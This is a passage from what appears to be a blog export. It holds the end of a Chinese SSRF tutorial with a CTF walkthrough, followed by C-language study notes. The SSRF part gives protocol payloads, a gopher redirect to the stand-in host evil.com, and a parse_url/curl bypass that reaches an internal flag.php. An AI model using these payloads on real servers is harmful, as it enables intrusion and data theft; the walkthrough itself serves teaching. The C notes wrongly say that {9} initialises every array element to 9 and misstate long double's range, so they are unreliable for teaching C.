<blockquote>
<p>dict协议是一个<font color="green">字典服务器协议</font>，通常用于让客户端使用过程中能够访问更多的字典源</p>
</blockquote>
<p>DICT URL scheme 通过 DICT 协议引入定义或者可用的单词列表:</p>
<pre><code>http://example.com/ssrf.php?dict://ad.com:1337/</code></pre><h3 id="sftp"><a href="#sftp" class="headerlink" title="sftp://"></a>sftp://</h3><p>Sftp 是一个 SSH 文件传输协议或安全文件传输协议，和 SSH 打包在一起的单独协议，和 ssh 一样都是通过安全连接进行通信。</p>
<pre><code>http://example.com/ssrf.php?url=sftp://ad.com:1337/</code></pre><h3 id="tftp"><a href="#tftp" class="headerlink" title="tftp://"></a>tftp://</h3><p>ftfp 用来在客户机与服务器之间进行简单文件传输的协议，提供不复杂、开销不大的文件传输服务。</p>
<pre><code>http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</code></pre><h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher://"></a>gopher://</h3><p>Gopher 是一个分布式文档传输服务，允许用户以无缝的方式针对放在不同位置的文档进行浏览、查询、获取。</p>
<pre><code>http://example.com/ssrf.php?url=http://ad.com/gopher.php</code></pre><p>gopher.php (host it on ad.com):</p>
<pre><code>&lt;?php
  header(&#39;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#39;);
?&gt;</code></pre><p>PS: <font color="red">在php中要使用gopher协议需要curl的支持</font></p>
<hr>
<p>这里我用一道ctf的题目来说，题目如下：</p>
<pre><code>&lt;?php

function check_inner_ip($url)
{
    $match_result=preg_match(&#39;/^(http|https)?:\/\/.*(\/)?.*$/&#39;,$url);
    if (!$match_result)
    {
        die(&#39;url fomat error1&#39;);
    }
    try
    {
        $url_parse=parse_url($url);
    }
    catch(Exception $e)
    {
        die(&#39;url fomat error2&#39;);
    }
    $hostname=$url_parse[&#39;host&#39;];
    echo $url_parse[&#39;host&#39;];
    $ip=gethostbyname($hostname);
    $int_ip=ip2long($ip);
    return ip2long(&#39;127.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;10.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;172.16.0.0&#39;)&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long(&#39;192.168.0.0&#39;)&gt;&gt;16 == $int_ip&gt;&gt;16 || ip2long(&#39;0.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24;
}

function safe_request_url($url)
{

    if (check_inner_ip($url))
    {
        echo $url.&#39; is inner ip&#39;;
    }
    else
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $output = curl_exec($ch);
        $result_info = curl_getinfo($ch);
        if ($result_info[&#39;redirect_url&#39;])
        {
            safe_request_url($result_info[&#39;redirect_url&#39;]);
        }
        curl_close($ch);
        var_dump($output);
    }

}

$url = $_POST[&#39;url&#39;];
if(!empty($url)){
    safe_request_url($url);
}
else{
    highlight_file(__file__);
}

//hint23333:
//flag in flag.php
//phpinfo in phpinfo.php

?&gt; </code></pre><p><font color="red">check_inner_ip</font> 通过 <font color="red">url_parse</font> 检测是否为内网 ip 。</p>
<p>如果满足不是内网 ip ，通过 <font color="red">curl </font>请求 url 返回结果。</p>
<p>乍一看好像并没有利用点，跳转也做了处理，最终都要经过 check_inner_ip 函数检测。但是忽略了 php_url_parse 和 curl 同时处理 url 不同。</p>
<p>当处理这个地址</p>
<pre><code>http://foo@example.com:80@google.com/</code></pre><p><font color="red">curl</font> 和<font color="red"> php_url_parse</font> 处理后最终的目标不一样</p>
<hr>
<p>分析一下代码逻辑，检测是否内网 ip 通过 parse_url，而最后请求是用 curl 完成的。当遇到上面的 url 格式时，parse_url 判断的是第二个 @ 后接的地址，curl 请求的是第一个。</p>
<p>于是利用思路就有了，让 parse_url 处理外部网站，最后 curl 请求内网网址。</p>
<p>构造 payload：</p>
<pre><code>http://foo@127.0.0.1:80 @www.baidu.com/flag.php</code></pre><p>可查询到本地的文件flag.php</p>
<blockquote>
<p>这个空格是为了绕过curl团队给出的一个补丁</p>
</blockquote>
<h2 id="漏洞常见位置"><a href="#漏洞常见位置" class="headerlink" title="漏洞常见位置"></a>漏洞常见位置</h2><ul>
<li>我觉得所有调外部资源的参数都有可能存在ssrf漏洞</li>
</ul>
<p>1）分享：通过URL地址分享网页内容</p>
<p>2）转码服务</p>
<p>3）在线翻译</p>
<p>4）图片加载与下载：通过URL地址加载或下载图片</p>
<p>5）图片、文章收藏功能</p>
<p>6）未公开的api实现以及其他调用URL的功能</p>
<p>7）从URL关键字中寻找：</p>
<pre><code>share
wap
url
link
src
source
target
u
3g
display
sourceURl
imageURL
domain
...</code></pre><h2 id="验证方法"><a href="#验证方法" class="headerlink" title="验证方法"></a>验证方法</h2><ul>
<li><p>因为SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的，从而来判断是否存在SSRF漏洞</p>
</li>
<li><p>在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.baidu.com/xxx.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="noopener">www.baidu.com/xxx.php?image=（地址）的就可能存在SSRF漏洞</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>WEB安全</category>
        <category>CTF</category>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>WEB安全</tag>
        <tag>CTF</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言学习笔记</title>
    <url>/2019/10/26/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(1)/</url>
    <content><![CDATA[<h1 id="C语言学习笔记"><a href="#C语言学习笔记" class="headerlink" title="C语言学习笔记"></a>C语言学习笔记</h1><hr>
<p>[TOC]</p>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a><strong>数据类型</strong></h2><h3 id="1-基本类型"><a href="#1-基本类型" class="headerlink" title="1.基本类型"></a>1.基本类型</h3><ul>
<li>整数型：int、short int、long int、long long int<blockquote>
<p>short int ≤ int ≤ long int≤ long long int</p>
</blockquote>
</li>
<li>浮点型：float、double、long double</li>
<li>字符型：char</li>
<li>布尔型：_Bool</li>
<li>枚举型(不常用)：enum</li>
</ul>
<hr>
<h4 id="sizeof运算符"><a href="#sizeof运算符" class="headerlink" title="sizeof运算符"></a>sizeof运算符</h4><blockquote>
<ul>
<li>概念：sizeof运算符用于获得数据类型或表达式长度</li>
<li>用法：</li>
</ul>
</blockquote>
<pre class=" language-c"><code class="language-c"><span class="token keyword">sizeof</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//查看对象长度 等价于sizeof object;</span>
<span class="token keyword">sizeof</span><span class="token punctuation">(</span>type_name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//查看数据类型</span></code></pre>
<hr>
<h4 id="类型限制符"><a href="#类型限制符" class="headerlink" title="类型限制符"></a>类型限制符</h4><blockquote>
<ul>
<li>signed：表示变量带符号位（可存放负数）</li>
<li>unsigned：表示变量不带符号位（不能存放负数，但意味着<font color="red">能存放更大的值</font>）</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>用法：<blockquote>
<ul>
<li>[signed] short [int]</li>
<li>unsigned short [int]</li>
<li>[signed] int</li>
<li>unsigned int</li>
<li>[signed] long [int]</li>
<li>unsigned long [int]</li>
<li>[signed] long long [int]</li>
<li>unsigned long long [int]</li>
</ul>
</blockquote>
</li>
</ul>
</blockquote>
<a id="more"></a>

<h3 id="2-指针类型"><a href="#2-指针类型" class="headerlink" title="2.指针类型"></a>2.指针类型</h3><h3 id="3-构造类型"><a href="#3-构造类型" class="headerlink" title="3.构造类型"></a>3.构造类型</h3><ul>
<li><p>数组类型</p>
</li>
<li><p>结构类型</p>
</li>
<li><p>联合类型</p>
</li>
</ul>
<h3 id="4-空类型"><a href="#4-空类型" class="headerlink" title="4.空类型"></a>4.空类型</h3><hr>
<hr>
<h2 id="取值范围"><a href="#取值范围" class="headerlink" title="取值范围"></a><strong>取值范围</strong></h2><h3 id="1-单位"><a href="#1-单位" class="headerlink" title="1.单位"></a>1.单位</h3><ul>
<li>比特位（bit）:CPU能读懂的最小单位</li>
<li>字节（Byte）：内存机构的最小寻址单位</li>
<li>换算：1 Byte == 8 bit</li>
</ul>
<hr>
<h3 id="2-进制换算"><a href="#2-进制换算" class="headerlink" title="2.进制换算"></a>2.进制换算</h3><table>
<thead>
<tr>
<th>二进制</th>
<th>十进制</th>
<th>十六进制</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>10</td>
<td>2</td>
<td>2</td>
</tr>
<tr>
<td>11</td>
<td>3</td>
<td>3</td>
</tr>
<tr>
<td>100</td>
<td>4</td>
<td>4</td>
</tr>
<tr>
<td>101</td>
<td>5</td>
<td>5</td>
</tr>
<tr>
<td>110</td>
<td>6</td>
<td>6</td>
</tr>
<tr>
<td>111</td>
<td>7</td>
<td>7</td>
</tr>
<tr>
<td>1000</td>
<td>8</td>
<td>8</td>
</tr>
<tr>
<td>1001</td>
<td>9</td>
<td>9</td>
</tr>
<tr>
<td>1010</td>
<td>10</td>
<td>A</td>
</tr>
<tr>
<td>1011</td>
<td>11</td>
<td>B</td>
</tr>
<tr>
<td>1100</td>
<td>12</td>
<td>C</td>
</tr>
<tr>
<td>1101</td>
<td>13</td>
<td>D</td>
</tr>
<tr>
<td>1110</td>
<td>14</td>
<td>E</td>
</tr>
<tr>
<td>1111</td>
<td>15</td>
<td>F</td>
</tr>
<tr>
<td>10000</td>
<td>16</td>
<td>10</td>
</tr>
<tr>
<td>10001</td>
<td>17</td>
<td>11</td>
</tr>
<tr>
<td>…</td>
<td>…</td>
<td>…</td>
</tr>
<tr>
<td>11111111</td>
<td>255</td>
<td>FF</td>
</tr>
</tbody></table>
<ul>
<li>十进制二进制转换：2的n次方减1</li>
</ul>
<hr>
<h3 id="3-符号位"><a href="#3-符号位" class="headerlink" title="3.符号位"></a>3.符号位</h3><ul>
<li><p>存放signed的类型的储存单元中，左边第一位表示符号位，如果该位为1就表示该数为负，如果该位为0就表示该数为正</p>
</li>
<li><p>一个32位的整形变量，除去左边第一个符号位，剩下表示的值只有31个比特位</p>
</li>
</ul>
<hr>
<h3 id="4-补码"><a href="#4-补码" class="headerlink" title="4.补码"></a>4.补码</h3><ul>
<li><p>正数的补码是该数的二进制形式</p>
</li>
<li><p>负数的补码通过几个步骤取得：</p>
<p>1.先取得该数的绝对值的二进制形式</p>
<p>2.将第一步的值按位取反（把1变为0，把0变成1）</p>
<p>3.将第二步的值加一</p>
</li>
</ul>
<hr>
<h3 id="5-基本数据类型的取值范围"><a href="#5-基本数据类型的取值范围" class="headerlink" title="5.基本数据类型的取值范围"></a>5.基本数据类型的取值范围</h3><table>
<thead>
<tr>
<th>数据类型</th>
<th>字节数</th>
<th>取值范围</th>
</tr>
</thead>
<tbody><tr>
<td>char</td>
<td>1</td>
<td>-128 ~ 127</td>
</tr>
<tr>
<td>unsigned char</td>
<td>1</td>
<td>0 ~ 255</td>
</tr>
<tr>
<td>short</td>
<td>2</td>
<td>-32768 ~ 32767</td>
</tr>
<tr>
<td>unsigned short</td>
<td>2</td>
<td>0 ~ 65535</td>
</tr>
<tr>
<td>int</td>
<td>4</td>
<td>-2147483648 ~ 2147483647</td>
</tr>
<tr>
<td>unsigned int</td>
<td>4</td>
<td>0 ~ 4294967295</td>
</tr>
<tr>
<td>long</td>
<td>4</td>
<td>-2147483648 ~ 2147483647</td>
</tr>
<tr>
<td>unsigned long</td>
<td>4</td>
<td>0 ~ 4294967295</td>
</tr>
<tr>
<td>long long</td>
<td>8</td>
<td>-9223372036854775808 ~ 9223372036854775807</td>
</tr>
<tr>
<td>unsigned long long</td>
<td>8</td>
<td>0 ~ 18446744073709551615</td>
</tr>
<tr>
<td>float</td>
<td>4</td>
<td>1.7549 * 10^-38 ~ 3.40282 * 10^38</td>
</tr>
<tr>
<td>double</td>
<td>8</td>
<td>2.22507 * 10^-308 ~ 1.79765 * 10^308</td>
</tr>
<tr>
<td>long double</td>
<td>12</td>
<td>2.22507 * 10^-308 ~ 1.79765 * 10^108</td>
</tr>
</tbody></table>
<hr>
<hr>
<h2 id="字符与字符串"><a href="#字符与字符串" class="headerlink" title="字符与字符串"></a><strong>字符与字符串</strong></h2><h3 id="1-ASCII表"><a href="#1-ASCII表" class="headerlink" title="1.ASCII表"></a>1.ASCII表</h3><p><img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1538458003104&di=4b3f3ad99e68ea4b01f90fe5504ee854&imgtype=0&src=http%3A%2F%2Fimg.bimg.126.net%2Fphoto%2FnjtcLwoNWZ51joclAWjzKw%3D%3D%2F308215099515025170.jpg" alt></p>
<h3 id="2-字符串"><a href="#2-字符串" class="headerlink" title="2.字符串"></a>2.字符串</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> 变量名<span class="token punctuation">[</span>数量<span class="token punctuation">]</span><span class="token punctuation">;</span>

变量名<span class="token punctuation">[</span>索引号<span class="token punctuation">]</span> <span class="token operator">=</span> 字符<span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">//声明字符串</span>
<span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">//给字符串赋值</span>
name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'N'</span><span class="token punctuation">;</span>
name<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'i'</span><span class="token punctuation">;</span>
name<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'n'</span><span class="token punctuation">;</span>
name<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'e'</span><span class="token punctuation">;</span>
name<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'K'</span><span class="token punctuation">;</span></code></pre>
<ul>
<li>注意在末尾添加\0 , 否则会出现乱码</li>
</ul>
<hr>
<hr>
<h2 id="字符与字符串-1"><a href="#字符与字符串-1" class="headerlink" title="字符与字符串"></a><strong>字符与字符串</strong></h2><h3 id="运算符："><a href="#运算符：" class="headerlink" title="运算符："></a>运算符：</h3><ul>
<li>C语言通过提供运算符来支持我们对数据的处理</li>
</ul>
<h4 id="1-算术运算符"><a href="#1-算术运算符" class="headerlink" title="1.算术运算符:"></a>1.算术运算符:</h4><p><img src="https://fishc.com.cn/forum.php?mod=image&aid=41750&size=400x300&key=3d2c5badf61607a4&type=1" alt></p>
<ul>
<li>目：操作数的个数</li>
<li>表达式：用运算符和括号将操作数连接起来的式子<br>比如：1 + 1、a + b</li>
</ul>
<ul>
<li>类型转换：<br>(数据类型)值</li>
</ul>
<hr>
<h4 id="2-关系运算符"><a href="#2-关系运算符" class="headerlink" title="2.关系运算符"></a>2.关系运算符</h4><ul>
<li>使用关系运算符来比较两个数的大小关系</li>
</ul>
<p><img src="https://fishc.com.cn/forum.php?mod=image&aid=41978&size=400x300&key=879f47f9d6645672&type=1" alt></p>
<ul>
<li>关系表达式：用关系运算符将两边的变量、数据或表达式连接起来，称之为关系表达式</li>
</ul>
<blockquote>
<p>如：1&lt;2、a&gt;b、(a=3) &gt; (b=5)</p>
</blockquote>
<blockquote>
<p>关系表达式得到的值是一个逻辑值，即判断结果为“真”或“假”，如果结果为“真”，关系表达式的值为 1，如果为“假”，关系表达式的值则为 0。</p>
</blockquote>
<hr>
<h4 id="3-逻辑运算符"><a href="#3-逻辑运算符" class="headerlink" title="3..逻辑运算符"></a>3..逻辑运算符</h4><ul>
<li><p>C语言总共提供了三种逻辑运算符：<br><img src="https://fishc.com.cn/forum.php?mod=image&aid=41969&size=400x300&key=c0bbd69ffca9fa16&type=1" alt></p>
</li>
<li><p>逻辑表达式：用逻辑运算符将两边的变量、数据或表达式连接起来，称之为逻辑表达式</p>
</li>
</ul>
<blockquote>
<p>如:3 &gt; 1 &amp;&amp; 1 &lt; 2</p>
</blockquote>
<ul>
<li><font color="red">注：关系表达式和逻辑表达式得到的值都是一个逻辑值，也就是表示真的 1 和表示假的 0。但是用于判断一个值是否为真时，以 0 表示假，以任何非 0 的数表示真。一个是编译系统告诉我们的结果，一个是我们让编译系统去判断的，两者方向不同。</font></li>
</ul>
<h4 id="4-运算符的优先级和结合性："><a href="#4-运算符的优先级和结合性：" class="headerlink" title="4.运算符的优先级和结合性："></a>4.运算符的优先级和结合性：</h4><p><img src="https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=1011419353,2642700465&fm=26&gp=0.jpg" alt="image"></p>
<h4 id="5-短路求值"><a href="#5-短路求值" class="headerlink" title="5.短路求值"></a>5.短路求值</h4><ul>
<li><p>短路求值又称最小化求值，是一种逻辑运算符的求值策略。只有当第一个运算数的值无法确定逻辑运算的结果时，才对第二个运算数进行求值。</p>
</li>
<li><p>C 语言对于逻辑与和逻辑或采用短路求值的方式。</p>
</li>
</ul>
<ul>
<li>例如：<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
</code></pre>
</li>
</ul>
<p>int main()<br>{<br>        int a = 3, b = 3;</p>
<pre><code>    (a = 0) &amp;&amp; (b = 5);
    printf(&quot;a = %d, b = %d\n&quot;, a, b);

    (a = 1) || (b = 5);
    printf(&quot;a = %d, b = %d\n&quot;, a, b);

    return 0;</code></pre><p>}</p>
<pre><code>结果为：![](https://fishc.com.cn/forum.php?mod=image&amp;aid=41970&amp;size=400x300&amp;key=3d6e6c06c1d0cd8f&amp;type=1)

***
***

## **if语句**
### 语句1
```c
if(表达式){
    ...   //逻辑值为真所执行的语句或程序块
}</code></pre><hr>
<h3 id="语句2"><a href="#语句2" class="headerlink" title="语句2"></a>语句2</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>表达式<span class="token number">1</span><span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
    …… <span class="token comment" spellcheck="true">// 逻辑值为真所执行的语句、程序块</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>表达式<span class="token number">2</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    …… <span class="token comment" spellcheck="true">// 逻辑值为真所执行的语句、程序块</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>表达式<span class="token number">3</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    …… <span class="token comment" spellcheck="true">// 逻辑值为真所执行的语句、程序块</span>
<span class="token punctuation">}</span></code></pre>
<hr>
<hr>
<h2 id="switch语句与分支嵌套"><a href="#switch语句与分支嵌套" class="headerlink" title="switch语句与分支嵌套"></a><strong>switch语句与分支嵌套</strong></h2><h3 id="1-switch语句"><a href="#1-switch语句" class="headerlink" title="1.switch语句"></a>1.switch语句</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">switch</span> <span class="token punctuation">(</span>表达式<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">case</span> 常量表达式<span class="token number">1</span><span class="token punctuation">:</span> 语句或程序块
    <span class="token keyword">case</span> 常量表达式<span class="token number">2</span><span class="token punctuation">:</span> 语句或程序块
    ……
    <span class="token keyword">case</span> 常量表达式n：语句或程序块
    <span class="token keyword">default</span><span class="token punctuation">:</span> 语句或程序块 
<span class="token punctuation">}</span></code></pre>
<ul>
<li>这里每个 case 后边的常量是匹配 switch 后边表达式的值</li>
<li>case 后边必须跟一个常量值，而不能是一个范围</li>
<li>如果所有的 case 均没有匹配的，那么执行 default 的内容</li>
<li>default 是可选的，如果没有 default，并且所有的 case 均不匹配，那么 switch 语句不执行任何动作</li>
</ul>
<hr>
<h3 id="2-使用-break-语句跳出"><a href="#2-使用-break-语句跳出" class="headerlink" title="2. 使用 break 语句跳出"></a>2. 使用 break 语句跳出</h3><ul>
<li>switch 语句中的 case 和 default 事实上都是“标签”，用来标志一个位置而已。</li>
<li>当 switch 跳到某个位置之后，就会一直往下执行，所以我们这里还需要配合一个 break 语句，让代码在适当的位置跳出 switch。</li>
</ul>
<hr>
<h3 id="3-分支结构的嵌套"><a href="#3-分支结构的嵌套" class="headerlink" title="3. 分支结构的嵌套"></a>3. 分支结构的嵌套</h3><ul>
<li>如果在一个 if 语句中包含另一个 if 语句，我们就称之为 if 语句的嵌套，也叫分支结构的嵌套。<br><img src="https://fishc.com.cn/forum.php?mod=image&aid=42523&size=400x300&key=0c6b31924edebe20&type=1" alt></li>
</ul>
<hr>
<h3 id="4-else悬挂"><a href="#4-else悬挂" class="headerlink" title="4.else悬挂"></a>4.else悬挂</h3><ul>
<li>C 语言中有这样的规则，else 始终与同一对括号内最近的未匹配的 if 结合。</li>
</ul>
<hr>
<h3 id="5-等于号带来的问题"><a href="#5-等于号带来的问题" class="headerlink" title="5. 等于号带来的问题"></a>5. 等于号带来的问题</h3><ul>
<li><p>在 C 语言中使用等号（=）作为赋值运算，使用连续两个等号（==）作为比较运算。一般而言，赋值运算相对于比较运算出现得更频繁，因此字符较少的 = 就被赋予了更常用的含义——赋值操作。</p>
</li>
<li><p>此外，在 C 语言中赋值符号被作为一种操作符对待，因而重复进行赋值操作（如 a = b = c）可以很容易地书写，并且赋值操作还可以被嵌入到更大的表达式中。</p>
</li>
<li><p>但是，这种使用上的便利性可能导致一个潜在的问题：当程序员本意是在作比较运算时，却可能无意中误写成赋值运算</p>
</li>
</ul>
<hr>
<hr>
<h2 id="while语句与do-while语句"><a href="#while语句与do-while语句" class="headerlink" title="while语句与do while语句"></a><strong>while语句与do while语句</strong></h2><h3 id="1-循环结构"><a href="#1-循环结构" class="headerlink" title="1.循环结构"></a>1.循环结构</h3><ul>
<li>当我们需要重复执行同一段代码很多次的时候，就可以使用循环结构来解决。</li>
</ul>
<hr>
<h3 id="2-while语句"><a href="#2-while语句" class="headerlink" title="2.while语句"></a>2.while语句</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span>表达式<span class="token punctuation">)</span>
    循环体</code></pre>
<ul>
<li>while 语句的语法非常简单，只要表达式的值为真，那么就会不断执行循环体里边的语句或程序块。<br><img src="https://fishc.com.cn/forum.php?mod=image&aid=42690&size=400x300&key=25005d39fc536b73&type=1" alt></li>
</ul>
<hr>
<h3 id="3-do-while-语句"><a href="#3-do-while-语句" class="headerlink" title="3.do while 语句"></a>3.do while 语句</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">do</span>
    循环体
<span class="token keyword">while</span> <span class="token punctuation">(</span>表达式<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<ul>
<li><p>while 是先判断表达式，如果表达式结果为真，才执行循环体里边的内容；</p>
</li>
<li><p>而 do…while 则相反，先执行循环体的内容再判断表达式是否为真。</p>
</li>
</ul>
<p><img src="https://fishc.com.cn/forum.php?mod=image&aid=42691&size=400x300&key=de54871239f4aafb&type=1" alt></p>
<ul>
<li><font color="red">注意：do…while 语句在 while 后边一定要用分号（;）表示语句结束。</font></li>
</ul>
<hr>
<hr>
<h2 id="for语句与循环嵌套"><a href="#for语句与循环嵌套" class="headerlink" title="for语句与循环嵌套"></a><strong>for语句与循环嵌套</strong></h2><h3 id="1-循环三要点"><a href="#1-循环三要点" class="headerlink" title="1.循环三要点"></a>1.循环三要点</h3><ul>
<li>初始化计数器</li>
<li>判断循环条件是否满足</li>
<li>更新计数器</li>
</ul>
<hr>
<h3 id="2-for语句"><a href="#2-for语句" class="headerlink" title="2.for语句"></a>2.for语句</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span>表达式<span class="token number">1</span><span class="token punctuation">;</span> 表达式<span class="token number">2</span><span class="token punctuation">;</span> 表达式<span class="token number">3</span><span class="token punctuation">)</span>
        循环体</code></pre>
<ul>
<li>三个表达式用分号隔开，其中：</li>
</ul>
<blockquote>
<p>表达式1是循环初始化表达式</p>
</blockquote>
<blockquote>
<p>表达式2是循环条件表达式</p>
</blockquote>
<blockquote>
<p>表达式3是循环调整表达式</p>
</blockquote>
<ul>
<li>特点：</li>
</ul>
<p>for 语句的表达式1，表达式2和表达式3都可以按照需要进行省略（但分号不能省）：</p>
<blockquote>
<p>for ( ; 表达式2; 表达式3)</p>
</blockquote>
<blockquote>
<p>for (表达式1; 表达式2; )</p>
</blockquote>
<blockquote>
<p>for (表达式1; ; )</p>
</blockquote>
<blockquote>
<p>for ( ; ; )</p>
</blockquote>
<blockquote>
<p>……</p>
</blockquote>
<ul>
<li><font color="red">注意：如果目的不是特别明确，建议不要这么做，因为程序的可读性会因此而降低！</font></li>
</ul>
<hr>
<h3 id="3-循环嵌套"><a href="#3-循环嵌套" class="headerlink" title="3. 循环嵌套"></a>3. 循环嵌套</h3><ul>
<li><p>循环结构跟分支结构一样，都可以实现嵌套。</p>
</li>
<li><p>对于嵌套的循环结构，执行顺序是从内到外：先执行内层循环，再执行外层循环。</p>
</li>
</ul>
<hr>
<hr>
<h2 id="break语句和continue语句"><a href="#break语句和continue语句" class="headerlink" title="break语句和continue语句"></a><strong>break语句和continue语句</strong></h2><h3 id="1-break-语句"><a href="#1-break-语句" class="headerlink" title="1.break 语句"></a>1.break 语句</h3><ul>
<li><p>在循环体中，如果我们想要让程序在中途跳出循环，那么我们同样可以使用 break 语句来实现。</p>
</li>
<li><p>执行 break 语句，直接跳出循环体。</p>
</li>
<li><p><font color="red">对于嵌套循环来说，break 语句只负责跳出所在的那一层循环，要跳出外层循环则需要再布置一个 break 语句才行。</font></p>
</li>
</ul>
<hr>
<h3 id="2-continue语句"><a href="#2-continue语句" class="headerlink" title="2.continue语句"></a>2.continue语句</h3><ul>
<li><p>当满足某个条件的时候，跳过本轮循环的内容，直接开始下一轮循环。这时候我们应该使用 continue 语句。</p>
</li>
<li><p>当执行到 continue 语句的时候，循环体的剩余部分将被忽略，直接进入下一轮循环。</p>
</li>
<li><p>对于嵌套循环来说，continue 语句跟 break 语句是一样的：它们都只能作用于一层循环体。</p>
</li>
</ul>
<hr>
<h3 id="3-for-语句和-while-语句执行过程的区别"><a href="#3-for-语句和-while-语句执行过程的区别" class="headerlink" title="3. for 语句和 while 语句执行过程的区别"></a>3. for 语句和 while 语句执行过程的区别</h3><ul>
<li><p>for 语句和 while语句执行过程是有区别的，它们的区别在于出现 continue 语句时。</p>
</li>
<li><p>在 for 语句中，continue语句跳过循环的剩余部分，直接回到调整部分。</p>
</li>
<li><p>在 while 语句中，调整部分是循环体的一部分，因此 continue 语句会把它也跳过。</p>
</li>
</ul>
<hr>
<hr>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a><strong>数组</strong></h2><h3 id="1-数组的含义"><a href="#1-数组的含义" class="headerlink" title="1.数组的含义"></a>1.数组的含义</h3><ul>
<li>数组是储存同类型数据的地方</li>
</ul>
<h3 id="2-定义数组"><a href="#2-定义数组" class="headerlink" title="2.定义数组"></a>2.定义数组</h3><ul>
<li>类型 数组名[常量表达式] 例如：<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">double</span> b<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
</li>
</ul>
<h3 id="3-访问"><a href="#3-访问" class="headerlink" title="3.访问"></a>3.访问</h3><ul>
<li><p>数组名[下标]</p>
<pre class=" language-c"><code class="language-c">a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
b<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
</li>
<li><p><font color="red">第一个元素的下标是0而不是1</font></p>
</li>
</ul>
<h3 id="4-数组的初始化"><a href="#4-数组的初始化" class="headerlink" title="4.数组的初始化"></a>4.数组的初始化</h3><ul>
<li><p>在定义数组的同时对其各个元素进行赋值，称之为数组的初始化</p>
</li>
<li><p>第一种：将所有元素统一初始化为某个值</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">9</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
</li>
<li><p>第二种：赋不同值，用逗号隔开</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
</li>
